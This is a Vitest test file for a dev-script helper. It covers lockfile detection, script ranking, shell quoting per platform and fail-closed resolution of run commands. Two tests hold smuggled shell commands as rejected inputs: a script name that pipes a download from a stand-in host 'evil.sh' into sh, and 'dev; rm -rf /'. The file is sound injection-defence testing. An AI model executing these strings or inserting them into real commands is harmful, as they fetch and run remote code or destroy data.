import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import {
  detectManager,
  findScriptGroups,
  rankScripts,
  resolveRunLine,
  runLine,
} from '../../server/lib/dev-script';

describe('detectManager', () => {
  it('reads the lockfile, defaulting to npm', () => {
    expect(detectManager(['package.json', 'pnpm-lock.yaml'])).toBe('pnpm');
    expect(detectManager(['yarn.lock'])).toBe('yarn');
    expect(detectManager(['bun.lockb'])).toBe('bun');
    expect(detectManager(['package.json'])).toBe('npm');
  });

  it('prefers bun when a repo carries several lockfiles', () => {
    // Migrations leave the old one behind; the newest tool is the live one.
    expect(detectManager(['package-lock.json', 'bun.lock'])).toBe('bun');
  });
});

describe('rankScripts', () => {
  it('puts dev ahead of start (start serves a build that may not exist)', () => {
    const out = rankScripts({ start: 'next start', build: 'next build', dev: 'next dev' });
    expect(out.map((s) => s.name)).toEqual(['dev', 'start']);
  });

  it('drops one-shot tasks so Run is never offered next to a test suite', () => {
    const out = rankScripts({ test: 'vitest run', lint: 'eslint .', build: 'tsc -b' });
    expect(out).toEqual([]);
  });

  it('recognises a dev server hiding under an unconventional name', () => {
    const out = rankScripts({ watch: 'nodemon server.js', clean: 'rimraf dist' });
    expect(out.map((s) => s.name)).toEqual(['watch']);
  });

  it('ranks namespaced dev scripts below the plain ones, stably', () => {
    const out = rankScripts({ 'dev:api': 'nest start', dev: 'next dev', 'dev:web': 'vite' });
    expect(out.map((s) => s.name)).toEqual(['dev', 'dev:api', 'dev:web']);
  });

  // The command is typed into an interactive shell, so a script name is a
  // command-injection vector with package.json as the delivery vehicle.
  it('refuses to offer a script whose name is shell syntax', () => {
    const out = rankScripts({ 'dev && curl evil.sh | sh': 'next dev', dev: 'next dev' });
    expect(out.map((s) => s.name)).toEqual(['dev']);
  });

  it('ignores non-string script values', () => {
    expect(rankScripts({ dev: { nested: true }, start: 'node .' }).map((s) => s.name)).toEqual(['start']);
  });
});

describe('runLine', () => {
  it('uses each manager s own invocation', () => {
    expect(runLine('npm', 'dev')).toBe('npm run dev');
    expect(runLine('pnpm', 'dev')).toBe('pnpm dev');
    expect(runLine('yarn', 'dev')).toBe('yarn dev');
    expect(runLine('bun', 'dev')).toBe('bun run dev');
  });

  it('cds into a workspace with platform-correct quoting', () => {
    expect(runLine('npm', 'dev', 'apps/web', 'linux')).toBe("cd 'apps/web' && npm run dev");
    // cmd.exe: /d for a drive change, backslashes, double quotes for spaces.
    expect(runLine('npm', 'dev', 'apps/web', 'win32')).toBe('cd /d "apps\\web" && npm run dev');
  });

  it('escapes a single quote in a posix path rather than ending the string', () => {
    expect(runLine('npm', 'dev', "it's/web", 'linux')).toBe("cd 'it'\\''s/web' && npm run dev");
  });
});

describe('findScriptGroups + resolveRunLine', () => {
  let root: string;

  beforeAll(() => {
    root = mkdtempSync(path.join(tmpdir(), 'smx-devscript-'));
    writeFileSync(
      path.join(root, 'package.json'),
      JSON.stringify({ workspaces: ['apps/*'], scripts: { dev: 'next dev', build: 'next build' } }),
    );
    writeFileSync(path.join(root, 'pnpm-lock.yaml'), '');
    mkdirSync(path.join(root, 'apps', 'web'), { recursive: true });
    writeFileSync(
      path.join(root, 'apps', 'web', 'package.json'),
      JSON.stringify({ scripts: { dev: 'vite', start: 'vite preview' } }),
    );
    // A workspace with nothing to run must not produce an empty row.
    mkdirSync(path.join(root, 'apps', 'docs'), { recursive: true });
    writeFileSync(path.join(root, 'apps', 'docs', 'package.json'), JSON.stringify({ scripts: { build: 'tsc' } }));
  });

  afterAll(() => rmSync(root, { recursive: true, force: true }));

  it('lists the root first, then workspaces that actually have a dev script', async () => {
    const groups = await findScriptGroups(root);
    expect(groups.map((g) => g.subdir)).toEqual(['', 'apps/web']);
    expect(groups[0]).toMatchObject({ manager: 'pnpm', scripts: [{ name: 'dev', command: 'next dev' }] });
    // Each dir gets its OWN lockfile answer — apps/web has none, so npm.
    expect(groups[1].manager).toBe('npm');
  });

  it('builds the command from the repo, not from the request', async () => {
    expect(await resolveRunLine(root, '', 'dev')).toEqual({ command: 'pnpm dev', manager: 'pnpm' });
    expect(await resolveRunLine(root, 'apps/web', 'dev')).toMatchObject({
      command: expect.stringContaining('npm run dev'),
    });
  });

  // Fail closed: this is the only path from a request to a command line.
  it('refuses a script the repo does not declare', async () => {
    expect(await resolveRunLine(root, '', 'build')).toBe(null); // real script, but not a dev one
    expect(await resolveRunLine(root, '', 'nope')).toBe(null);
    expect(await resolveRunLine(root, 'apps/docs', 'dev')).toBe(null); // wrong workspace
    expect(await resolveRunLine(root, '../elsewhere', 'dev')).toBe(null);
    expect(await resolveRunLine(root, '', 'dev; rm -rf /')).toBe(null);
  });

  it('returns nothing for a repo with no package.json', async () => {
    const bare = mkdtempSync(path.join(tmpdir(), 'smx-bare-'));
    try {
      expect(await findScriptGroups(bare)).toEqual([]);
    } finally {
      rmSync(bare, { recursive: true, force: true });
    }
  });
});
